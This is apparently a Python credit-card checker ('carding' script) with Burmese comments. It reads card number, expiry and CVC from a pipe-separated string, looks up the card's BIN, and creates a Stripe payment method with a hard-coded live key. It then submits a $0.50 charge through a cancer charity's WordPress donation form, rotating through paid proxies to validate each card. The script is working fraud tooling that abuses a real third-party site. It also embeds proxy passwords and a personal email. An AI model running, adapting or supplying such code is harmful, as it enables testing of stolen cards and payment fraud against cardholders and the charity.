import requests, re
import random
import itertools
import time

# ===== Proxy Configuration =====
PROXIES_LIST = [
    "p101.instantproxies.com:9207:9012:RP1vGZQZhhlK",
    "p103.instantproxies.com:9206:9011:ufrvfyLUDAK4",
]

def _build_proxy_dict(proxy_str):
    parts = proxy_str.strip().split(":")
    host, port, user, pwd = parts
    proxy_url = f"http://{user}:{pwd}@{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}

_proxy_cycle = itertools.cycle(PROXIES_LIST)

def _get_next_proxy():
    return _build_proxy_dict(next(_proxy_cycle))

# =================================

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy: 
        yy = yy.split("20")[1]
    
    # =======================================================
    # 1. BIN API အချက်အလက်များ ရှာဖွေခြင်း
    # =======================================================
    bin_6 = n[:6]
    bin_info_str = ""
    
    # ပိုမိုမြန်ဆန်ပြီး Data ပြည့်စုံတဲ့ API တစ်ခုတည်းကိုပဲ သုံးမယ် (Antipublic)
    try:
        bin_res = requests.get(f"https://bins.antipublic.cc/bins/{bin_6}", timeout=5)
        if bin_res.status_code == 200:
            bin_data = bin_res.json()
            bank = bin_data.get('bank', 'Unknown').title()
            country_name = bin_data.get('country_name', 'Unknown').title()
            country_flag = bin_data.get('country_flag', '🏳️')
            flag = bin_data.get('brand', 'Unknown').capitalize() + " - " + bin_data.get('type', 'Unknown').capitalize()
            
            bin_info_str = f"\n├ 𝗕𝗜𝗡 ➜ {bin_6}\n├ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➜ {country_name} {country_flag}\n├ 𝗕𝗔𝗡𝗞 ➜ {bank}\n└ 𝗙𝗟𝗔𝗚 ➜ {flag}"
    except Exception:
        pass # BIN API Fail ရင် ကျော်သွားမယ်

    # =======================================================
    # 2. Stripe နှင့် Site သို့ ချိတ်ဆက်ခြင်း (Proxy ဖြင့်)
    # =======================================================
    result = "Declined" 
    success = False
    
    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    stripe_data = f'type=card&billing_details[name]=Niko&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fa246437755%3B+stripe-js-v3%2Fa246437755%3B+card-element&key=pk_live_KgCOosHro91pZXJzb7nQOFEJ00m4nfhXh6'

    site_headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://staging.spottingcancer.org',
        'Referer': 'https://staging.spottingcancer.org/donate/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }

    # Proxy နဲ့ ၂ ကြိမ် စမ်းမယ်၊ မရရင် Direct (Proxy မပါဘဲ) စမ်းမယ်
    for attempt in range(3):
        try:
            if attempt < 2:
                # Proxy သုံးမယ်
                proxies = _get_next_proxy()
            else:
                # Proxy အားလုံး ပျက်ရင် Direct သွားမယ်
                proxies = None 

            # Stripe API ခေါ်ခြင်း
            stripe_res = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxies=proxies, timeout=15)
            pm = stripe_res.json()['id']
            
            # Site API ခေါ်ခြင်း
            site_data = {
                'action': 'wp_full_stripe_inline_payment_charge',
                'wpfs-form-name': 'One-Time-Donation',
                'wpfs-form-get-parameters': '%7B%7D',
                'wpfs-custom-amount': 'other',
                'wpfs-custom-amount-unique': '0.5',
                'wpfs-custom-input[]': 'Lee',
                'wpfs-billing-name': 'Niko Daxx ',
                'wpfs-billing-address-country': 'US',
                'wpfs-billing-address-line-1': '27 Allen St',
                'wpfs-billing-address-line-2': '',
                'wpfs-billing-address-city': 'New York ',
                'wpfs-billing-address-state': '',
                'wpfs-billing-address-state-select': 'NY',
                'wpfs-billing-address-zip': '10002',
                'wpfs-card-holder-email': 'sattlin10@gmail.com',
                'wpfs-card-holder-name': 'Niko',
                'wpfs-stripe-payment-method-id': f'{pm}',
            }
            
            site_res = requests.post('https://staging.spottingcancer.org/wp-admin/admin-ajax.php', headers=site_headers, data=site_data, proxies=proxies, timeout=15)
            result = site_res.json()['message']
            success = True
            break # အောင်မြင်ရင် ထွက်မယ်
            
        except Exception as e:
            print(f"Attempt {attempt + 1} Failed: {type(e).__name__}")
            time.sleep(1) # ၁ စက္ကန့်စောင့်မယ်

    if not success:
        result = "API Error (Network/Proxy Failed)"

    final_result = f"{result}{bin_info_str}"
    return final_result